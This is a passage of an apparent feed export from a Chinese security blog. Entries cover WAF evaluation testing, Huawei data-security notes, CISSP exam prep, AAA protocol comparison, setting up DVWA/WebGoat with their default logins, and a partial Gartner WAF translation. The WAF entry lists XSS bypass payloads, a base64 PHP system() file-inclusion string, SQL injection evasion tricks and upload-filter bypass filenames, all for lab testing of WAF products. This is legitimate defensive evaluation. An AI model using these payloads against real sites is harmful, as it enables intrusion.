      <category term="安全相关" scheme="http://www.lewisec.com/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="Imperva" scheme="http://www.lewisec.com/tags/Imperva/"/>
    
      <category term="WAF" scheme="http://www.lewisec.com/tags/WAF/"/>
    
      <category term="FortiWeb" scheme="http://www.lewisec.com/tags/FortiWeb/"/>
    
  </entry>
  
  <entry>
    <title>从甲方的角度谈谈WAF测试方法--part1</title>
    <link href="http://www.lewisec.com/2016/09/16/%E4%BB%8E%E7%94%B2%E6%96%B9%E7%9A%84%E8%A7%92%E5%BA%A6%E8%B0%88%E8%B0%88WAF%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95-part1/"/>
    <id>http://www.lewisec.com/2016/09/16/从甲方的角度谈谈WAF测试方法-part1/</id>
    <published>2016-09-16T14:44:11.735Z</published>
    <updated>2016-09-16T15:02:11.612Z</updated>
    
    <content type="html"><![CDATA[<p>网络上很多同行都发文讨论过各种绕WAF的技巧，也有很多文章分享自研WAF的思路。<br>作为传统行业的甲方安全工程师，我试着写一写自己在WAF选型测试时的大体思路。<br>一方面，是对自己完成一个项目的总结，另一方面，也算是提供一个不同的视角看看WAF，希望对乙方朋友今后设计、优化WAF产品有一点点帮助。</p>
<a id="more"></a>
<h3 id="0X01-测试思路"><a href="#0X01-测试思路" class="headerlink" title="0X01 测试思路"></a>0X01 测试思路</h3><ul>
<li>环境搭建<ul>
<li>服务器：使用DVWA搭建一套包含各类漏洞的网站，并开启access日志以供分析。DVWA搭建过程不细说。</li>
<li>WAF：反向代理部署，将DVWA服务器做反向代理后映射出VS IP。测试时所有payload发送至VS IP，经WAF处理后交给DVWA服务器。</li>
</ul>
</li>
<li>测试方法：客户端构造payload提交给VS IP，服务器查看access日志。如被有效识别并过滤，access日志应没有相关内容。</li>
</ul>
<h3 id="0X02-OWASP-TOP10-常规防御"><a href="#0X02-OWASP-TOP10-常规防御" class="headerlink" title="0X02 OWASP TOP10 常规防御"></a>0X02 OWASP TOP10 常规防御</h3><ul>
<li>SQLi<ul>
<li>get型注入：<a href="http://10.44.100.18/dvwa/vulnerabilities/sqli/?id=22&amp;Submit=Submit#" target="_blank" rel="external">http://10.44.100.18/dvwa/vulnerabilities/sqli/?id=22&amp;Submit=Submit#</a> 的参数id可以注入，构造payload提交即可。</li>
<li>post型注入：DVWA登录过程用burpsuite抓包，即可构造post型注入。</li>
</ul>
</li>
<li>XSS<ul>
<li>反射型XSS和存储型XSS在DVWA中都有，构造payload即可。</li>
</ul>
</li>
<li>CSRF、command injection、Brute Foce、File upload等等方式，DVWA都有了，不细说。</li>
<li>漏掉的是SSRF、反序列化、structs、心脏滴血，这些攻击在当前版本的DVWA中是没有设计的，需要单独考虑。</li>
</ul>
<h3 id="0X03-绕过技术的防御"><a href="#0X03-绕过技术的防御" class="headerlink" title="0X03 绕过技术的防御"></a>0X03 绕过技术的防御</h3><p>除了最常见攻击手法的防御以外，WAF还应该具备识别变形的Payload的能力。<br>目前国内外商业WAF可以识别99%以上的常规攻击手段，区别主要就体现在对各类编码后的变形Payload的分析能力上。<br>这里面又区分成了两大类思路。</p>
<h4 id="思路一："><a href="#思路一：" class="headerlink" title="思路一："></a>思路一：</h4><p>WAF抓取到HTTP包后，做多重解码，将每重解码的结果提取正则，与特征库进行匹配。各家能解码的层数会有区别。F5的ASM可以支持最多5层并且允许用户手工设定层数。其他家虽不可指定解码层数，但都具备相应能力。</p>
<h4 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h4><p>考虑到正则匹配容易误报漏报，有厂家放弃了这种分析模式，转而做语义分析。长亭科技的SqlChop就是如此，详情可阅读：<a href="https://blog.chaitin.com/sqlchop-the-sqli-detection-engine/" target="_blank" rel="external">SQLChop - 一个新型 SQL 注入检测引擎</a><br>在测试中，需要手工对payload做编码变形。详细说来：</p>
<h4 id="SQLi变形"><a href="#SQLi变形" class="headerlink" title="SQLi变形"></a>SQLi变形</h4><ul>
<li>urlencode编码：别小看这种常见的绕过方法，有厂家的WAF还真检测不出来。</li>
<li>unicode编码</li>
<li>关键字大小写替换：这个比较常规了，基本是没有检测不到的。</li>
<li>关键字转为十六进制</li>
<li>关键字用反引号引起来</li>
<li>关键字用/#!  #/注释引起来</li>
<li>关键字用/##/注释截断：select转为sel/**/ect</li>
<li>关键字用%00截断</li>
<li>提交的HTTP包中，将x-originating-IP 改为127.0.0.1</li>
<li>提交的HTTP包中，将X-remote-addr 改为127.0.0.1</li>
<li>SQLMAP的各类TAMPER，挨个试一试吧</li>
</ul>
<h4 id="XSS变形"><a href="#XSS变形" class="headerlink" title="XSS变形"></a>XSS变形</h4><p>XSS变形最多，WAF漏报也是最严重的。谁让HTML可利用的标签那么多呢。<br>这一块的测试，有赖于测试者平时收集各类XSS payload 的量。我仅列出一部分常见的以供参考：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;embed/src=<span class="comment">//goo.gl/nlX0P&gt;</span></div><div class="line">&lt;object data=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="</span>&gt;</div><div class="line">&lt;a onmouseover="javascript:window.onerror=alert;throw 1&gt;</div><div class="line">&lt;svg&gt;&lt;script&gt;varmyvar="YourInput";&lt;/script&gt;&lt;/svg&gt;</div><div class="line">&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt;</div><div class="line">&lt;script&gt;//@cc_on!alert(1)/*@cc_on~alert(2)@*/&lt;/script&gt;</div><div class="line">&lt;marquee/onstart=confirm(2)&gt;/</div><div class="line">&lt;a/onmouseover[\x0b]=location=&amp;#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&amp;#039;&gt;XSS</div></pre></td></tr></table></figure></p>
<h4 id="文件包含绕过"><a href="#文件包含绕过" class="headerlink" title="文件包含绕过"></a>文件包含绕过</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">data:text/plain;base64,ZGF0YTp0ZXh0L3BsYWluLDw/cGhwIHN5c3RlbSgnY2F0IC92YXIvd3d3L0ZpbGVJbmNsdWRlLnBocCcpPz4=</div></pre></td></tr></table></figure>
<h4 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h4><p>文件上传绕过主要考虑几个方面：</p>
<ul>
<li>123.php.123</li>
<li>123.asp;.gif</li>
<li>as.php%00.gif</li>
<li>文件开头添加GIF89a</li>
<li>burpsuite抓包修改Content-Type: image/jpeg</li>
</ul>
<p>###0X03 扫描器防御能力<br>WAF应具备根据数据包特征识别扫描器的能力，并加以阻止。常见的扫描器，如WVS、SQLMAP、Netsparker、havij、Appscan都应该拿来实际测试WAF的反应。<br>需要说明的一点是，WAF不仅要拦截扫描器发来的数据包，还应在日志中注明，攻击者使用何种扫描器。这对运维人员分析日志很有帮助。<br>例如，实际测试中，Imperva对SQLMAP和Netsparker都可以准确识别。而F5的ASM则可以准确识别WVS和SQLMAP。FortiWeb则不具备这个能力。</p>
<p>剩下几个章节，将讨论以下内容：</p>
<ul>
<li>Webshell通信拦截测试</li>
<li>其余几个小功能点测试</li>
<li>设备自身安全测试</li>
<li>自学习模式测试</li>
<li>WAF测试工具</li>
<li>WAF 管理维护功能测试<br>未完待续</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;网络上很多同行都发文讨论过各种绕WAF的技巧，也有很多文章分享自研WAF的思路。&lt;br&gt;作为传统行业的甲方安全工程师，我试着写一写自己在WAF选型测试时的大体思路。&lt;br&gt;一方面，是对自己完成一个项目的总结，另一方面，也算是提供一个不同的视角看看WAF，希望对乙方朋友今后设计、优化WAF产品有一点点帮助。&lt;/p&gt;
    
    </summary>
    
      <category term="安全相关" scheme="http://www.lewisec.com/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="Imperva" scheme="http://www.lewisec.com/tags/Imperva/"/>
    
      <category term="WAF" scheme="http://www.lewisec.com/tags/WAF/"/>
    
      <category term="FortiWeb" scheme="http://www.lewisec.com/tags/FortiWeb/"/>
    
  </entry>
  
  <entry>
    <title>华为数据安全管理实践学习笔记</title>
    <link href="http://www.lewisec.com/2016/09/05/%E5%8D%8E%E4%B8%BA%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%AE%9E%E8%B7%B5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://www.lewisec.com/2016/09/05/华为数据安全管理实践学习笔记/</id>
    <published>2016-09-05T14:56:11.000Z</published>
    <updated>2016-09-05T14:57:31.591Z</updated>
    
    <content type="html"><![CDATA[<p>在2016云栖安全大会上，华为信息安全运营总监孙颖老师分享了华为在做内部安全管理和运营的宝贵经验，受益匪浅。记录笔记如下，我的感悟是黑斜体部分。<br><a id="more"></a></p>
<h3 id="原则"><a href="#原则" class="headerlink" title="原则"></a>原则</h3><ul>
<li>明确核心信息资产清单  </li>
<li>流程、组织、技术三方面建设整体方案<br><strong><em>资产清单是管理的抓手，只有明确了要保护什么，才能有的放矢。但梳理信息资产清单，并设计可落地的分级分类措施，这是难点。如何让员工短时间内学会并准确执行分级分类的要求？如何以流程化的方式确保分级分类的落地？这才是管理的核心问题。</em></strong><h3 id="信息分级分类"><a href="#信息分级分类" class="headerlink" title="信息分级分类"></a>信息分级分类</h3></li>
<li>明确核心资产在业务流程中的流转过程</li>
<li>明确核心资产在不同系统中的流转过程<br><strong><em>四大的方法论中也有类似的内容。难点仍旧是落地。不能指望业务部门的员工认真分析这两个流转过程，而安全部门又没有能力分析准确。如何有效率的与业务部门结合，花最小的成本高质量的完成梳理工作，这是重点</em></strong><h3 id="融入业务流程"><a href="#融入业务流程" class="headerlink" title="融入业务流程"></a>融入业务流程</h3></li>
<li>按流程划分SDLC阶段</li>
<li>每个阶段明确核心资产清单是什么</li>
<li>明确在每个阶段，每个核心资产所在位置</li>
<li>明确每个阶段、每个资产，在每个位置的安全要求</li>
<li>实现安全融入流程，化整为零，完成对业务流程的安全改造，润物细无声</li>
<li>补充：数据上载PDM后，本机不留源码副本，并有专人检查<br><strong><em>这是对前文所述的两大流转过程梳理的细化描述。目标是改造出安全的业务流程，达到润物细无声的境界，难度很大</em></strong><h3 id="安全服务举例"><a href="#安全服务举例" class="headerlink" title="安全服务举例"></a>安全服务举例</h3></li>
<li>一键式获取权限，减少对业务影响</li>
<li>在申请流程中明确告知事项，不需要用户自己去找</li>
<li>直接主管负责审批<h3 id="安全流程"><a href="#安全流程" class="headerlink" title="安全流程"></a>安全流程</h3></li>
<li>细化业务流程的操作阶段</li>
<li>每个阶段留存独立的日志：授权日志、查询日志、导出日志、加密授权日志、邮件发送日志<br><strong><em>留存日志并定期审计，这是对安全态势的监控，也是对员工的威慑与引导</em></strong></li>
</ul>
<p>上述思路其实四大顾问曾经带着我们做过一轮，华为的确是把这套方法论完整落地执行，并且看到了产出物与收益的。这一点的确要佩服华为安全部。<br>务虚的东西看似美好而遥不可及，但真正落地执行了才知道其中的艰难辛苦。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在2016云栖安全大会上，华为信息安全运营总监孙颖老师分享了华为在做内部安全管理和运营的宝贵经验，受益匪浅。记录笔记如下，我的感悟是黑斜体部分。&lt;br&gt;
    
    </summary>
    
      <category term="安全相关" scheme="http://www.lewisec.com/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="安全管理" scheme="http://www.lewisec.com/tags/%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>CISSP备考经验</title>
    <link href="http://www.lewisec.com/2016/09/04/CISSP%E5%A4%87%E8%80%83%E7%BB%8F%E9%AA%8C/"/>
    <id>http://www.lewisec.com/2016/09/04/CISSP备考经验/</id>
    <published>2016-09-03T16:18:22.000Z</published>
    <updated>2016-09-03T16:26:09.786Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0X00-引子"><a href="#0X00-引子" class="headerlink" title="0X00 引子"></a>0X00 引子</h2><p>2016年9月2日，北京。<br>在经历了5小时30分钟的煎熬后，我在一台电脑上点击了“结束考试”的按钮，走出狭小的考试房。两位年轻的监考老师开始在她们的电脑上操作，一位起身去了打印机旁边，另一位告诉我可以收拾东西了，回去等邮箱里面的邮件通知吧。根据考友们的信息，一般通过考试的才会收到ISC2的邮件通知的，考试失败的会当场给一份成绩说明。果然，监考老师把打印好的成绩单递给了我，一句简单的“恭喜啊”让我悬着的心落地了。随之而来的好像没有预想中的兴奋，只是一种放松。<br>在努力了8个月之后，我终于通过了CISSP的考试。</p>
<p>记录一些经验，分享给仍然奋战在CISSP备考道路上的各位安全同行们。<br><a id="more"></a></p>
<h2 id="0X01-证书简介"><a href="#0X01-证书简介" class="headerlink" title="0X01 证书简介"></a>0X01 证书简介</h2><p>CISSP认证的简介，网上一大堆。我只多说以下几点：</p>
<ul>
<li>截至2016年3月，中国大陆地区持有证书人数为1800人左右。</li>
<li>CISSP目前在市面上没有题库可以背。ISC2对题库的保护非常严格，严禁通过考试后公开讨论试题。</li>
<li>CISSP报考是有门槛要求的，通过考试后也必须提交安全行业的从业经历证明，才能拿到证书。</li>
</ul>
<h2 id="0X02-教材推荐"><a href="#0X02-教材推荐" class="headerlink" title="0X02 教材推荐"></a>0X02 教材推荐</h2><p>目前使用人数比较多的CISSP备考教材有以下几本，我逐个分析优劣。</p>
<ul>
<li>The Official (ISC)² Guide to the CISSP CBK。这是官方指定的教材。目前出到第四版。紧跟官方考试大纲。没有中文翻译版本，所以读起来会比较考验你的英文阅读能力。但这是我首推的一本书。官方教材还是更贴近考试一些。知识域的划分、概念的讲解都是比较原汁原味的，这对你考试时候理解考题的真实意图非常有帮助。这本书我是精读了一遍的，事实证明真心有用</li>
<li>Shon Harris的All In One。目前英文版出了第七版，中文版出到第六版。这也是翻译成中文的唯一一本教材。第六版仍旧参考的是老版CBK的知识域结构，这是硬伤。考试大纲调整后重新调整了知识域的架构，考试的侧重点也完全不一样了。比如，物理环境安全一章，AIO讲了一大堆锁、视频监控的东西，其实考纲根本不关心这些细节。最新的第七版我在备考时略读了一遍，架构更合理了，可以作为备选教材。</li>
<li>CISSP (ISC)² Certified Information Systems Security Professional Official Study Guide。最新版本是第七版。这本书很有意思，完全打散了考纲的架构，作者根据自己的理解重新组织成了21章。这本书我只是拿来做参考用的，行文风格比较口语化，不像CBK那么一板一眼的。不建议作为主力教材复习。</li>
<li>Eleventh Hour CISSP Study Guide。这本书我也看了看，是大纲型的书籍，知识点不详细展开，整理了一下知识脉络而已。我在高铁上花了两个多小时看了一大半之后，就放弃了这本书。</li>
</ul>
<p>建议以CBK为主，AIO为辅。CBK的英文看不懂的时候，翻翻AIO的翻译帮助理解记忆。</p>
<h2 id="0X03-测试题选择"><a href="#0X03-测试题选择" class="headerlink" title="0X03 测试题选择"></a>0X03 测试题选择</h2><p>市面上现在找不到真题题库，只有各类模拟题。首推CBK课后的练习题，这些对加深记忆非常有用。另外，AIO随书光盘还有一千多道题，我到临考前都没做完。这些题考基础概念比较多，但实际考试中直来直去问概念的题非常少。所以这些题只能帮助你理解概念。<br>总之，不要期望你做过的模拟题会真的出现在考场上，理解本质最重要。<br>当你做AIO的题能达到80%的正确率的时候，是时候准备约考试啦！</p>
<h2 id="0X04-有关辅导班"><a href="#0X04-有关辅导班" class="headerlink" title="0X04 有关辅导班"></a>0X04 有关辅导班</h2><p>辅导班有用吗？我的经验是，辅导班最大的作用是帮助你梳理知识脉络，以过来人的角度告诉你哪些点可能考的比较多，哪些点出现在考试中的几率非常小。所以，别听他们吹嘘什么通过率90%+，但他们真的可以帮你节省复习时间。</p>
<h2 id="0X05-CISSP的作用及其他"><a href="#0X05-CISSP的作用及其他" class="headerlink" title="0X05 CISSP的作用及其他"></a>0X05 CISSP的作用及其他</h2><p>有人说，拿到了CISSP以后年薪可以上浮XX%。我觉得这是辅导班的宣传策略。有人说CISSP不考具体攻防技术，证书没用。我觉得这是唯技术论的一家之言。<br>备考这八个月，至少帮我梳理了一遍安全所有领域的知识点，扩宽了我的知识面。重新架构了对安全的全面理解，这是最重要的。<br>实现了2016年的第一个目标，心情还是很愉快的。</p>
<p>最后，住所有备考CISSP的同行们早日通过！</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0X00-引子&quot;&gt;&lt;a href=&quot;#0X00-引子&quot; class=&quot;headerlink&quot; title=&quot;0X00 引子&quot;&gt;&lt;/a&gt;0X00 引子&lt;/h2&gt;&lt;p&gt;2016年9月2日，北京。&lt;br&gt;在经历了5小时30分钟的煎熬后，我在一台电脑上点击了“结束考试”的按钮，走出狭小的考试房。两位年轻的监考老师开始在她们的电脑上操作，一位起身去了打印机旁边，另一位告诉我可以收拾东西了，回去等邮箱里面的邮件通知吧。根据考友们的信息，一般通过考试的才会收到ISC2的邮件通知的，考试失败的会当场给一份成绩说明。果然，监考老师把打印好的成绩单递给了我，一句简单的“恭喜啊”让我悬着的心落地了。随之而来的好像没有预想中的兴奋，只是一种放松。&lt;br&gt;在努力了8个月之后，我终于通过了CISSP的考试。&lt;/p&gt;
&lt;p&gt;记录一些经验，分享给仍然奋战在CISSP备考道路上的各位安全同行们。&lt;br&gt;
    
    </summary>
    
      <category term="安全相关" scheme="http://www.lewisec.com/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="CISSP" scheme="http://www.lewisec.com/tags/CISSP/"/>
    
  </entry>
  
  <entry>
    <title>Kerberos、RADIUS、TACACS+、Diameter协议区别</title>
    <link href="http://www.lewisec.com/2016/03/20/aaa/"/>
    <id>http://www.lewisec.com/2016/03/20/aaa/</id>
    <published>2016-03-20T08:21:59.000Z</published>
    <updated>2016-08-06T15:56:41.374Z</updated>
    
    <content type="html"><![CDATA[<p>最近在研究身份认证与访问控制的内容，CISSP ALL IN ONE第六版中，比较详细的解释了四种有关协议的定义、协议运行流程、协议特点。但是没有汇总在一起作比较，所以理解起来很容易混乱。</p>
<p>我用下面一个简单的表格，把相关内容汇总在一起做比较，希望能彻底搞清楚，记牢靠。</p>
<p>难免有不准确的地方，希望看到的高人、前辈多多指点。</p>
<a id="more"></a>
<p><img src="http://ob7tq8bas.bkt.clouddn.com/AAA.png" alt="" title="AAA"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在研究身份认证与访问控制的内容，CISSP ALL IN ONE第六版中，比较详细的解释了四种有关协议的定义、协议运行流程、协议特点。但是没有汇总在一起作比较，所以理解起来很容易混乱。&lt;/p&gt;
&lt;p&gt;我用下面一个简单的表格，把相关内容汇总在一起做比较，希望能彻底搞清楚，记牢靠。&lt;/p&gt;
&lt;p&gt;难免有不准确的地方，希望看到的高人、前辈多多指点。&lt;/p&gt;
    
    </summary>
    
      <category term="安全相关" scheme="http://www.lewisec.com/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"/>
    
    
  </entry>
  
  <entry>
    <title>搭建WebGoat和DVWA</title>
    <link href="http://www.lewisec.com/2016/02/21/webgoatdvwa/"/>
    <id>http://www.lewisec.com/2016/02/21/webgoatdvwa/</id>
    <published>2016-02-21T05:51:04.000Z</published>
    <updated>2016-08-07T15:20:54.204Z</updated>
    
    <content type="html"><![CDATA[<p>在虚拟机下搭建了WebGoat和DVWA以供测试。<br><a id="more"></a></p>
<p>WebGoat部署最简单，批处理运行一下就可以用了。这里说一点。有时候希望把搭建好的WebGoat提供给内网更多的用户访问，默认情况下只能本机用localhost使用，这就需要修改tomcat的配置。</p>
<p>在WebGoat目录下找到tomcat文件夹，找server_80.xml，里面有一行：</p>
<p><span style="color: #ff0000;"><em>Connector address=”127.0.0.1” port=”80” maxHttpHeaderSize=”8192”</em></span></p>
<p><span style="color: #000000;">把其中的adress=“127.0.0.1”删掉，保存，然后重启tomcat即可。</span></p>
<p>这一句的意思是，默认情况下只允许本机环回地址127.0.0.1连接使用。</p>
<p>DVWA部署也不复杂，下载XAMPP装好，注意给mysql设置好root密码。能访问phpmyadmin，就说明一切正常了。</p>
<p>把DVWA解压缩到xampp的htdocs文件夹下即可。</p>
<p>dvwa默认有五个用户：<br>admin/password<br>gordonb/abc123<br>1337/charley<br>pablo/letmein<br>smithy/password</p>
<p>另外，如果之前已经部署了WebGoat，80端口被占用，DVWA就起不起来了。</p>
<p>.\xampp\apache\conf\httpd.conf 打开配置文件，把Listen 80 改成其他自定义的端口即可。</p>
<p>没什么含金量，就是给自己留个笔记。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在虚拟机下搭建了WebGoat和DVWA以供测试。&lt;br&gt;
    
    </summary>
    
      <category term="安全相关" scheme="http://www.lewisec.com/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="DVWA" scheme="http://www.lewisec.com/tags/DVWA/"/>
    
      <category term="WebGoat" scheme="http://www.lewisec.com/tags/WebGoat/"/>
    
      <category term="XAMPP" scheme="http://www.lewisec.com/tags/XAMPP/"/>
    
  </entry>
  
  <entry>
    <title>Gartner WAF 2015 魔力象限节选翻译</title>
    <link href="http://www.lewisec.com/2016/02/02/Gartner%20WAF%202015%20%E9%AD%94%E5%8A%9B%E8%B1%A1%E9%99%90%E8%8A%82%E9%80%89%E7%BF%BB%E8%AF%91/"/>
    <id>http://www.lewisec.com/2016/02/02/Gartner WAF 2015 魔力象限节选翻译/</id>
    <published>2016-02-02T04:05:15.000Z</published>
    <updated>2016-08-07T14:59:25.877Z</updated>
    
    <content type="html"><![CDATA[<p>工作原因，最近开始研究主流市场的各类WAF产品。Gartner的魔力象限分析是必不可少的重要材料。节选了部分2015年度WAF领域的报告翻译了出来，给自己存个档。</p>
<a id="more"></a>
<p>—————————分割线————————————–</p>
<p>waf市场被用户需求驱动，用户需要保护内部和公开的web应用，在web应用本地部署或者远程部署。waf部署在web服务器前面用来保护web应用，对抗内外部攻击者。也可以部署为镜像模式，收集访问日志用于合规审计和分析。waf常见的部署方式是以反向代理的方式串联在网络，因为在历史上这是唯一可以做深度检查的方式。现在，其他部署方式也存在了，比如透明代理、桥模式，或者把waf部署在旁路（带外管理或者镜像模式）。</p>
<p>waf最大的优势是保护企业的web应用免遭由自身代码漏洞造成的缺陷。第二，waf可以与其他应用安全和网络安全技术相集成，比如和应用安全测试（AST）、抗DDOS攻击、web诈骗检测、数据库安全。除此之外，waf有时还包含应用交付功能，包括内容缓存。当waf包含web访问管理模块时，还可以包含身份认证管理特性，比如实现单点登录或web应用分发。</p>
<p>在这个魔力象限中，供应商必须是面向终端用户的waf市场供应者。技术必须包含特定针对web安全保护，超过使用特征匹配的下一代防火墙和ips。waf产品应该支持单一或多台web服务器部署方式。这个魔力象限包含的waf，都是部署在webserver前端的设备，不是webserver插件的方式。包含：</p>
<p>-物理部署设备，虚拟机形态或者软件形态<br>-waf必须深入应用层控制<br>-云服务或虚拟化支持，以IaaS平台形式<br>waf与其他企业安全技术–比如应用安全测试、数据库镜像、SIEM–相集成的能力经常是企业市场中的强劲存在。像ADCs或抗DDoS云服务这类技术，巩固了waf并带来了特殊收益，但是市场还是首先关注客户的web安全需求。尤其重要的是：</p>
<p>-对已知与未知威胁的最大限度的检测和拦截率<br>-最小的误报率，不影响web应用的连续服务<br>-高易用性<br>特别的，Gartner仔细检查了这些特性和创新保护能力，超出下一代防火墙和ips，开源waf比如modsecurity和ironbee。</p>
<p><img src="http://ob7tq8bas.bkt.clouddn.com/waf-gartner-2015.jpg" alt="" title="gartner"></p>
<p>供应商优劣势分析<br>梭子鱼</p>
<p>位于加州Campbell市，梭子鱼提供多种信息安全产品。梭子鱼的WAF有三种主要的特性：10种应用模式（5种核心模式，每种包含两个版本）最高可达4Gbps吞吐；可虚拟化；可部署在微软Azure、AWS、vCloud等云计算平台。</p>
<p>过去几个月中，梭子鱼完成支持JSON检测，URL编码，SAML2.0并升级了WAF的管理控制台。</p>
<p>梭子鱼被评价为挑战者，因为产品价格实惠，且效果良好。</p>
<p>优势</p>
<ul>
<li>梭子鱼产品线很广，而且是唯一一家供应商提供Azure和vCloud平台WAF。</li>
<li>梭子鱼的waf提供强壮的IP信誉库，cookie保护和客户端指纹识别。它还内嵌了认证功能并整合了一些第三方认证解决方案。</li>
<li>梭子鱼为客户提供高级别的地域分散的支持能力，并提供免费的可用性评估服务，四年的设备升级服务。</li>
<li><p>梭子鱼的管理界面提供多种不通语言，包括很多种欧洲语言，并且还有普通话、广东话、日语、韩语。这是其他供应商不具备的优势<br>劣势</p>
</li>
<li><p>Gartner研究发现梭子鱼的管理界面易用性较差。梭子鱼WAF的管理界面升级到V7.9之后，我们还没有收到客户反馈。</p>
</li>
<li>梭子鱼WAF在安全自动化方面落后于领导者厂商。漏洞扫描的结果必须手动导入。当应用改变后，自动学习默认是禁用的，而必须手动激活。</li>
<li>Gartner注意到商业客户候选名单很少提及梭子鱼WAf，而是在WAF升级时被考虑。</li>
<li>目前还没有5Gbps或10Gbps的模型用以支持商业客户案例。</li>
</ul>
<p>安恒</p>
<p>安恒，总部位于中国杭州，为web安全和数据库安全提供解决方案。2007年第一款WAF产品发布。同时提供web应用和数据库漏洞扫描，和一款数据库审计平台。<br>在2014年，安恒升级了硬件产品线，发布了四个模型，发布了WAF v4.0<br>安恒被评为“特定领域者”，因为安恒只在中国范围内面向中端市场出售WAF解决方案。<br>在中国，安恒是中小企业，小型金融和政府部门的不错候选品牌。</p>
<p>优势</p>
<ul>
<li>安恒waf包含自学习策略和web应用缓存，可部署为反向代理、透明代理或镜像模式。</li>
<li>客户提到选择安恒的原因是不错的价格和本地化服务。</li>
<li><p>安恒的waf可以和供应商的漏洞扫描、数据库安全产品相联动。<br>劣势</p>
</li>
<li><p>安恒的WAF在以下几个领域落后于竞争对手：基于角色的管理、详细的活动报告、身份认证管理。客户提到管理功能和报告功能还需要提升。</p>
</li>
<li>安恒的市场知名度非常有限，在中国以外的客户并没有把它列入候选名单。安恒主要服务于中小企业。</li>
<li>安恒没有向Gartner提供自己的国际化客户和增值分销商。在公司官网的国际版上仅有非常有限的信息。中国以外的潜在客户在考虑安恒WAF时会要求有同行业案例，并核查供应商与渠道的经验，购买前还会进行设备测试。</li>
<li>安恒的战略核心聚焦在漏洞扫描。WAF最近的升级和路线路是很有限的边际改善。</li>
</ul>
<p>F5<br>总部位于西雅图的F5是一家聚焦在应用交付领域的基础设施供应商。WAF是作为F5的big-ip应用交付平台的一个软件模块存在的，叫做ASM。经常作为F5的最佳实践组合包的一部分出售。F5其他安全模块包含网络防火墙AFM，接入策略管理APM、以及最近的Web安全网关服务和Web安全网络欺诈保护服务。WAF也在虚拟化版本的big-ip上可以部署使用。WAF是以授权控制的。<br>2014年，F5发布了一些新的WAf模块，提供了新的提醒，包含抗ddos服务。2015年上半年，还提供了云计算版本的waf服务。<br>F5被评为”挑战者“。当F5试着移动到”领导者“象限时取得了非常有限的成功。这是一家不错的候选供应商，尤其是对那些看重攻击识别的且已经拥有或正在考虑应用交付设备的大型组织来说。</p>
<p>优势</p>
<ul>
<li>接受调查的客户列出，最大优势是可以把ASM这款waf与F5的应用交付或其他产品相集成。很多Gartner的客户报告称，ASM WAF已经在影响他们选择应用交付产品时的决策。</li>
<li>F5的合作团队与渠道提供了良好的服务支持，相比主要的WAF供应商，地域覆盖更广。</li>
<li>ASM WAF使用相同的管理软件，F5的管理员会非常熟悉。客户还可以使用iRules脚本设定策略。</li>
<li>F5已经在添加一些WAF的新特性，包括对报警评分。</li>
<li><p>作为应用交付的领导级供应商，F5拥有大量保有客户，并利用应用交付销售机会作为WAF产品的销售切入点。对已经购买F5的客户，在已有的安全平台上添加一个WAF模块是容易的。<br>劣势</p>
</li>
<li><p>用户报告初始化配置和策略设定方面难度很大。在设备重启后，历史报告和自动策略很难维持原状。一些Gartner客户评论说ASM WAF还是很有挑战性的。</p>
</li>
<li>和其他应用交付为基础的waf一样，F5的waf客户认为waf是作为应用交付的一个扩展属性部署为反向代理模式。这些在F5与纯粹的WAf相比时处于劣势。</li>
<li>一些增值分销商也将F5作为他们的增值包中的纯粹防火墙。客户当要考虑F5时，需要寻找一个对产品足够熟悉的合作伙伴。</li>
</ul>
<p>Fortinet<br>坐落于加州森尼维尔市的飞塔公司，是一家重要的网络安全厂商。2000年，飞塔作为UTM供应商出现。稍后就扩展了自己的产品线，包含了更多的安全产品，比如WAF（Fortiweb，发布于2008年），应用交付（FortiADC），数据库保护平台。这家公司以其飞塔安全网关而著名，这也是他最有活力的产品线。</p>
<p>飞塔提供了多种产品形态，比如物理形态，或虚拟化形态。都可以部署在反向代理、透明代理，旁路模式。还可以部署在AWS上。功能上包含有ip信誉，反病毒和安全特征升级。</p>
<p>在过去的一年半里，飞塔发布了四次升级（v5.1到v5.4），为知名的web应用添加了模板，支持完全正向保密，支持与SIEM集成。公司还发布了一款入门级产品，FortiWeb 100D，并且还刷新了高端产品序列。</p>
<p>飞塔被评为”特定领域者“，尽管公司有强大的渠道，但是他们的waf解决方案并没有取得商业市场的成功。公司现有的客户和中小组织应该被飞塔认为是潜在客户。</p>
<p>优势</p>
<ul>
<li>良好的声誉，有竞争力的价格，飞塔其他产品的认可度，都是选择飞塔waf的理由。</li>
